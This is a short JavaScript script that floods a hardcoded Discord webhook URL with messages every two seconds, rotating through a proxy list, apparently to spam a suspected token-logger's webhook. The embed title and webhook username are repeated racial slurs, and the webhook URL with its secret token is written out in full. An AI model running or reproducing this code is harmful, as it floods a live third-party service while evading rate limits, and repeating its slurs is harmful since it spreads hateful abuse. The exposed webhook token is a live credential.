const lib = require('./index.js')

const proxies = require('./proxies.json').proxies

const data = new lib.MessageEmbed()
    .setTitle('nigger why are you token logging')

const webh = new lib.ChannelWebhook('https://discord.com/api/webhooks/800684474232602645/OfdDQjyXaULuE2raQon8g6qyMabOaKk1EcO_ivfGixgOmdiXLKekEokCnRGiMQ95TyCw')
webh.setUsername('nigger nigger nigger ')
setInterval(async () => {
    for (const i of proxies) {
        await webh.send(data, i)
        console.log('Sent payload from ' + i + ' to ' + webh.getURL())
    }
}, 2000)